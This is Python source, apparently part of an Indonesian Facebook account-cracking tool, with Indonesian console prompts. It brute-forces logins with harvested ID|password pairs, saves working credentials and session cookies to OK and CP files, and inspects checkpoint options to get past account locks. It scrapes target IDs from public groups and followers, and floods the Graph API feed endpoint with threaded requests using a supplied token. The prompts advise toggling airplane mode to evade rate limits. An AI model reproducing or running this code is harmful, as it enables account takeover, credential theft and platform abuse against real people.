			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r│%s[CP] %s • %s'%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw)
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp={'user-agent':'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36'}
				#if "Akun Anda Dikunci" in urlPost.text:
					#print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					#user=idf
					#session = requests.Session()
					#response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					#response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					#try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					#except:ttl=""
					#try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					#except:teman = ""
					#print('\r>>> OK <<<')
					print('\r│\x1b[38;5;46m[OK] %s • %s'%(idf,pw))
					#print(f'\r{P}>> Ttl : {ttl}')
					#print(f'\r{P}>> Teman : {teman}')
					#cek_apk(kuki)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#Update_Cek_Apk
def cek_apk(kuki):
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print("{P}[+] Apk yang terkait:")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print("  {N}[+] Apk Aktif :")
			print("   [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
		else:
			print("  {N}[+] Apk Aktif :")
			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print("   [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
			print("  {N}[+] Apk kadaluarsa :")
			print("   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
		else:
			hit1,hit2=0,0
			print("  {N}[+] Apk kadaluarsa :")
			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print("   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
				hit2+=1
	else:
		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
	print("")

# OPSI
def cekpk():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Pilih File Yang Alan Dicek')
		geeh = input(' \x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_File Tidak Ditemukan') 
				time.sleep(2)
				back()

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r│%s[CP] %s • %s'%(K,idf,pw))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r│%s Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,J))
		else:
			for opsii in opsi:
				print('\r%s│%s%s'%(H,opsii.text,K))
	except Exception as c:
		print('\r│%s[CP] %s • %s'%(K,idf,pw))
		print('\r│%s  Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(M,H))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Koneksi Internet Bermasalah')
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Beres') 
	exit()
	
balmond = O+"["+J+"•"+O+"]"

def lah():
	print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Total ID : "+str(len(id))+"                     ")
	input("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	setting()
	
def grup():
	jalan('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Harus Grup Public')
	id = input("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m  Id Atau User Name Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua2}
	url = "https://m.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		jalan("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Grup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Nama Grup : "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Anggota : -")
	else:
		print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Anggota : "+str(ang[0]))
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Jika Stack, Mode Pesawat 5 Detik")
	print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Sedang Mengumpulkan ID")
	print("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;231m >_Tekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+"├ { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+"├ { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://m.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()

saat_ini = datetime.datetime.now()

def run(link, token):

    while True:

        headers = {

            'authority': 'graph.facebook.com',

            'cache-control': 'max-age=0',

            'sec-ch-ua-mobile': '?0',

            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',

        }

        try:

          response = requests.post(f'https://graph.facebook.com/me/feed?link={link}&published=0&access_token={token}', headers=headers)

          print(response.text)

        except:

          sys.exit()

def main():

    banner()

    print('\x1b[0;94m┌───────────────────────────────────┐')
    #link = input('Link Posts : ')
    token = input('├──[•] Token Facebook :\x1b[0;92m ')

   # token = input('Token FB : ')
    link = input('\x1b[0;94m├──[•] Link Postingan :\x1b[0;92m ')
    print('├\x1b[0;94m└───────────────────────────────────┘')

    number_thread = int(input('[✓]––>ISI AJA 20 BG  :\x1b[0;92m  '))

    for i in range(number_thread):
        thread = threading.Thread(target=run, args=(link, token))
#        print('SINGEK',thread.start())
        thread.start()
        #
#def main():

    banner()

    print('\033[33m┌───────────────────────────────────┐')
    #link = input('Link Posts : ')
    token = input('├──>_Token Facebook :\033[33m ')

   # token = input('Token FB : ')
    link = input('\033[33m├──>_Link Postingan :\033[33m ')
    print('\033[33m└───────────────────────────────────┘')

    number_thread = int(input('>_ISI AJA 20 BG  :\033[33m  '))

    for i in range(number_thread):
        thread = threading.Thread(target=run, args=(link, token))
#        print('SINGEK',thread.start())
        thread.start()
        
def follower():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()

    jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Crack ID Dari Followers')
    print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \033[33m>_Ketik "me" Jika Ingin Dari Follower Mu')
    pili = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \033[33m>_Masukkan ID Facebook : ')
    try:
        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['subscribers']['data']:
            try:
                id.append(pi['id'] + '|' + pi['name'])
            except:
                continue

        print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m \033[33m>_Total : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Koneksi Internet Bermasalah') 
        exit()
    except (KeyError, IOError):
        print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m >_Followers Tidak Public Atau Token Rusak') 
        exit()

def useragent():
	print ("├\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s01%s]>_Ganti user agent "%(P,B,P))
	print ("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s02%s]>_Cek user agent "%(P,B,P))
	print ("├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s00%s]>_Kembali "%(P,B,P))
	hikmat = input('\n├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s+%s]>_Pilih :%s '%(P,H,P,B))
	uas(hikmat)
	
def uas(hikmat):
	if hikmat == '':
		print ('\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s!%s]>_Yang bener kontol'%(P,B,P));jeda(2)
		uas(hikmat)
	elif hikmat in("1","01"):
		print ("\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s!%s]>_Ketik %scancel%s untuk gunakan ua dari script"%(P,B,P,H,P))
		ua = input("\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s!%s]>_User agent :%s "%(P,H,P,B))
		if ua in(""):
			print ('\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s!%s]>_Yang bener kontol'%(P,H,P));jeda(2)
			menu()
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s✓%s] >_Berhasil menggunakan user agent script "%(P,B,P));jeda(2)
			pilihan().menu()
		open("ua.txt","w").write(ua);time.sleep(2)
		print ("\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s✓%s]>_Berhasil mengganti user agent"%(P,H,P));time.sleep(2)
		menu()
	elif hikmat in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();time.sleep(2)
			print ("\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s+%s]>_User anget lu :%s%s "%(P,H,P,B,ua_));time.sleep(2)
			input('\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s!%s]>_Tekan enter '%(P,B,P))
			menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif hikmat in("0","00"):
		menu()
	else:
		print ('\n\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;196m %s[%s!%s]>_Yang bener kontol'%(P,B,P));time.sleep(2)
		uas(hikmat)
		
def tokenfre():
        os.system('https://www.facebook.com/profile.php?id=100080507617596')
                        
if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	usa="Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36"
	ses=requests.Session()
	ses.headers.clear()
	ses.cookies.clear()
	ses.headers.update({"user-agent":usa})
	tzy()
      #menu()   
	#tzy()
	#memek() 